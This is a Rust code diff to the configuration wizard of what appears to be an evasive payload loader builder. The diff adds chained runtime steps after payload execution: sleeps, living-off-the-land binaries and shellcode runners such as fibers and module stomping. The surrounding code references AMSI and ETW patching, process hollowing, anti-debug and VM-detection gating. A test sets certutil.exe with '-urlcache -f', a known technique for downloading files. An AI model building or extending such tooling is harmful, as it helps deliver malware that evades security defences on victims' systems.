@@ -35,8 +35,9 @@ use crate::plan::schema::{
 };
 use crate::plan::validate;
 use crate::techniques::{
-    self, anti_debug, bouncer, early_bird, module_stomping, patch_amsi, patch_etw, pe_injection,
-    process_hollowing, sleep_obfuscation, Category, RuntimeStep, TechniqueDef, TechniqueKind,
+    self, anti_debug, bouncer, early_bird, living_off_the_land, module_stomping, patch_amsi,
+    patch_etw, pe_injection, process_hollowing, sleep, sleep_obfuscation, Category, RuntimeStep,
+    TechniqueDef, TechniqueKind,
 };
 use crate::ui::Palette;
 
@@ -172,6 +173,9 @@ struct Answers {
     payload_args: Vec<String>,
     execution: TechniqueKind,
     preparations: Vec<TechniqueKind>,
+    /// Additional runtime steps appended after the execution technique, in
+    /// order (Control steps and in-process runners that return control).
+    additional_steps: Vec<TechniqueKind>,
     strings_strategy: String,
     syscalls_mode: String,
     output_path: String,
@@ -584,9 +588,15 @@ impl Wizard<'_> {
 
         self.section("TECHNIQUES")?;
         let execution = self.ask_execution(previous.map(|answers| &answers.execution))?;
+        let format = default_format(&execution);
         let preparations = self.ask_preparations(
             previous.map_or(&[][..], |answers| answers.preparations.as_slice()),
             output_kind,
+        )?;
+        let additional_steps = self.ask_additional_steps(
+            previous.map(|answers| answers.additional_steps.as_slice()),
+            &execution,
+            format,
         )?;
 
         self.section("STUB")?;
@@ -692,6 +702,7 @@ impl Wizard<'_> {
             payload_args,
             execution,
             preparations,
+            additional_steps,
             strings_strategy,
             syscalls_mode,
             output_path,
@@ -727,7 +738,20 @@ impl Wizard<'_> {
         let index = self.prompts.select("execution", &options, default)?;
         let def = choices[index];
         let previous = previous.filter(|step| step.name() == def.name);
+        self.ask_execution_params(def, previous)
+    }
 
+    /// Asks the parameters of one Execution technique.
+    ///
+    /// Shared by the primary execution question and the appended runtime steps,
+    /// so an appended `module_stomping` asks for its stomp target the same way
+    /// the primary one does. Techniques the wizard has no tailored questions for
+    /// fall back to their documented `params_example`.
+    fn ask_execution_params(
+        &mut self,
+        def: &TechniqueDef,
+        previous: Option<&TechniqueKind>,
+    ) -> Result<TechniqueKind> {
         match def.name {
             "process_hollowing" => {
                 let default_target = match previous {
@@ -911,6 +935,93 @@ impl Wizard<'_> {
         }
     }
 
+    /// Asks whether to append more runtime steps after the execution technique.
+    ///
+    /// The loader keeps control only when the execution technique returns; when
+    /// it is terminal (`dotnet_hosting`, or `reflective_loading` of a PE
+    /// executable) a following step would never run, so nothing is appended. The
+    /// Control steps always return; the in-process runners return only for a
+    /// shellcode payload, so they are offered only then.
+    fn ask_additional_steps(
+        &mut self,
+        previous: Option<&[TechniqueKind]>,
+        execution: &TechniqueKind,
+        format: PayloadFormat,
+    ) -> Result<Vec<TechniqueKind>> {
+        if execution_is_terminal(execution, format) {
+            return Ok(Vec::new());
+        }
+        let choices = appendable_defs(format);
+        let options = describe(&choices);
+
+        let mut steps = Vec::new();
+        let mut position = 0;
+        loop {
+            let previous_step = previous.and_then(|steps| steps.get(position));
+            if !self
+                .prompts
+                .confirm("add another runtime step?", previous_step.is_some())?
+            {
+                break;
+            }
+            let default = previous_step
+                .and_then(|step| choices.iter().position(|def| def.name == step.name()))
+                .unwrap_or(0);
+            let index = self.prompts.select("append step", &options, default)?;
+            let def = choices[index];
+            let previous_step = previous_step.filter(|step| step.name() == def.name);
+            steps.push(self.ask_additional_step(def, previous_step)?);
+            position += 1;
+        }
+        Ok(steps)
+    }
+
+    /// Asks the parameters of one appended runtime step.
+    fn ask_additional_step(
+        &mut self,
+        def: &TechniqueDef,
+        previous: Option<&TechniqueKind>,
+    ) -> Result<TechniqueKind> {
+        self.blank()?;
+        let heading = self.ui.heading(def.name);
+        let subtitle = self.ui.dim(techniques::summary(def));
+        self.echo(&format!("{heading}  {subtitle}"))?;
+
+        match def.name {
+            "sleep" => {
+                let default_ms = match previous {
+                    Some(TechniqueKind::Sleep { params }) => params.ms,
+                    _ => sleep::default_ms(),
+                };
+                let ms = self.ask_number("ms", default_ms, 1, u64::MAX)?;
+                Ok(TechniqueKind::Sleep {
+                    params: sleep::Params { ms },
+                })
+            }
+            "living_off_the_land" => {
+                let (default_binary, default_args) = match previous {
+                    Some(TechniqueKind::LivingOffTheLand { params }) => {
+                        (params.binary.clone(), params.args.clone())
+                    }
+                    _ => ("cmd.exe".to_string(), Vec::new()),
+                };
+                let binary = self.ask_text("binary", &default_binary)?;
+                let args = self.ask_list("args (comma-separated)", &default_args)?;
+                Ok(TechniqueKind::LivingOffTheLand {
+                    params: living_off_the_land::Params {
+                        binary,
+                        args,
+                        ..Default::default()
+                    },
+                })
+            }
+            // The in-process runners reuse the primary execution's questions
+            // (`module_stomping` asks its target; the no-arg runners keep their
+            // `params_example` defaults).
+            _ => self.ask_execution_params(def, previous),
+        }
+    }
+
     /// The bouncer gate: how the checks combine, what to do on rejection, and
     /// which checks to declare (each with its own value question).
     fn ask_bouncer(
@@ -1076,6 +1187,40 @@ fn is_dll_incompatible(name: &str) -> bool {
     matches!(name, "self_deletion" | "sleep_obfuscation")
 }
 
+/// Whether an execution technique hands the whole process to the payload, so a
+/// following step would never run. Mirrors `plan::validate`'s terminal-step rule
+/// so the wizard never offers to append a step past it.
+fn execution_is_terminal(technique: &TechniqueKind, format: PayloadFormat) -> bool {
+    match technique {
+        TechniqueKind::DotnetHosting { .. } => true,
+        TechniqueKind::ReflectiveLoading { .. } => format == PayloadFormat::Pe,
+        _ => false,
+    }
+}
+
+/// The techniques the wizard offers as appendable runtime steps, in menu order.
+///
+/// The Control steps (`sleep`, `living_off_the_land`) always return control and
+/// are always offered. The in-process runners (`execution_callbacks`,
+/// `module_stomping`, `fibers`, `reflective_loading`) return only for a shellcode
+/// payload, so they are offered only then; a PE `reflective_loading` would be
+/// terminal.
+fn appendable_defs(format: PayloadFormat) -> Vec<&'static TechniqueDef> {
+    let mut names: Vec<&'static str> = vec!["sleep", "living_off_the_land"];
+    if format == PayloadFormat::Shellcode {
+        names.extend([
+            "execution_callbacks",
+            "module_stomping",
+            "fibers",
+            "reflective_loading",
+        ]);
+    }
+    names
+        .into_iter()
+        .filter_map(|name| techniques::find(name))
+        .collect()
+}
+
 /// The registered Execution techniques, in registry order.
 fn execution_defs() -> Vec<&'static TechniqueDef> {
     techniques::all()
@@ -1130,6 +1275,13 @@ fn assemble(payload: &Path, answers: &Answers) -> Plan {
         .map(RuntimeStep::new)
         .collect();
     runtime.push(RuntimeStep::new(answers.execution.clone()));
+    runtime.extend(
+        answers
+            .additional_steps
+            .iter()
+            .cloned()
+            .map(RuntimeStep::new),
+    );
 
     let payload_name = default_name(payload);
     let mut payloads = BTreeMap::new();
@@ -1465,6 +1617,7 @@ mod tests {
             "module_stomping",
             "dbghelp.dll",
             "",
+            "", // add another runtime step? -> no
             "",
             "",
             "",
@@ -1495,6 +1648,7 @@ mod tests {
             "C:\\Windows\\System32\\notepad.exe",
             "1500",
             "",
+            "", // add another runtime step? -> no
             "",
             "",
             "",
@@ -1533,6 +1687,7 @@ mod tests {
                 payload_args: Vec::new(),
                 execution: default_step(def).expect("params_example parses"),
                 preparations: Vec::new(),
+                additional_steps: Vec::new(),
                 strings_strategy: "xor".to_string(),
                 syscalls_mode: "none".to_string(),
                 output_path: "./dist/demo_packed.exe".to_string(),
@@ -1590,6 +1745,7 @@ mod tests {
             "",                  // bouncer on_fail -> silent
             "1,6",               // checks: hostname + not_in_vm
             "WORKSTATION-*",     // hostname
+            "",                  // add another runtime step? -> no
             "",                  // strings -> xor
             "",                  // syscalls -> none (indirect is x64-only)
             "",                  // output path
@@ -1631,6 +1787,95 @@ mod tests {
         assert!(
             plan.build.stub.syscalls.is_none(),
             "an x86 plan must not select indirect syscalls"
+        );
+    }
+
+    /// A shellcode payload can run several in-process steps: the wizard appends
+    /// Control and Execution steps in order, and every appended Execution step
+    /// references the single payload.
+    #[test]
+    fn a_multi_step_runtime_appends_steps_in_order() {
+        let dir = temp_dir("multistep");
+        let plan_path = dir.join("out.yaml");
+        let answers = [
+            "demo",                // name
+            "",                    // payload args
+            "",                    // arch -> x64
+            "",                    // output kind -> exe
+            "fibers",              // execution (a shellcode runner)
+            "",                    // preparations -> none
+            "y",                   // add another runtime step? -> yes
+            "sleep",               // append step -> sleep (menu #1)
+            "500",                 // sleep ms
+            "y",                   // add another runtime step? -> yes
+            "living_off_the_land", // append step -> exec (menu #2)
+            "certutil.exe",        // binary
+            "-urlcache,-f",        // args
+            "y",                   // add another runtime step? -> yes
+            "module_stomping",     // append step -> module_stomping (menu #4)
+            "dbghelp.dll",         // module
+            "",                    // add another runtime step? -> no
+            "",                    // strings
+            "",                    // syscalls
+            "",                    // output path
+            "",                    // strip
+            "",                    // trim paths
+            "",                    // review -> build now
+        ];
+
+        let (written, _) = session("payload.exe", &answers, Some(&plan_path));
+        assert_eq!(written.as_deref(), Some(plan_path.as_path()));
+
+        let plan = load_plan(&plan_path, &BTreeMap::new()).expect("valid plan");
+        assert_eq!(plan.runtime.len(), 4);
+
+        let TechniqueKind::Fibers { params } = &plan.runtime[0].technique else {
+            panic!("expected fibers first, got {:?}", plan.runtime[0]);
+        };
+        assert_eq!(params.payload, None);
+
+        let TechniqueKind::Sleep { params } = &plan.runtime[1].technique else {
+            panic!("expected sleep second, got {:?}", plan.runtime[1]);
+        };
+        assert_eq!(params.ms, 500);
+
+        let TechniqueKind::LivingOffTheLand { params } = &plan.runtime[2].technique else {
+            panic!(
+                "expected living_off_the_land third, got {:?}",
+                plan.runtime[2]
+            );
+        };
+        assert_eq!(params.binary, "certutil.exe");
+        assert_eq!(params.args, vec!["-urlcache", "-f"]);
+
+        let TechniqueKind::ModuleStomping { params } = &plan.runtime[3].technique else {
+            panic!("expected module_stomping fourth, got {:?}", plan.runtime[3]);
+        };
+        assert_eq!(params.module, "dbghelp.dll");
+        assert_eq!(params.payload, None);
+
+        // Every appended step still references the one wizard payload.
+        let payload = plan.build.payloads.get("payload").expect("the payload");
+        assert_eq!(payload.format, PayloadFormat::Shellcode);
+    }
+
+    /// A terminal execution (`reflective_loading` of a PE executable) hands the
+    /// process to the payload, so the wizard must not offer to append a step
+    /// after it.
+    #[test]
+    fn a_terminal_execution_offers_no_further_steps() {
+        let dir = temp_dir("terminal");
+        let plan_path = dir.join("out.yaml");
+        let answers = ["", "", "", "", "", "", "", "", "", "", "", ""];
+
+        let (written, transcript) = session("payload.exe", &answers, Some(&plan_path));
+        assert_eq!(written.as_deref(), Some(plan_path.as_path()));
+
+        let plan = load_plan(&plan_path, &BTreeMap::new()).expect("valid plan");
+        assert_eq!(plan.runtime.len(), 1);
+        assert!(
+            !transcript.contains("add another runtime step"),
+            "a terminal execution must not offer appended steps: {transcript}"
         );
     }
 
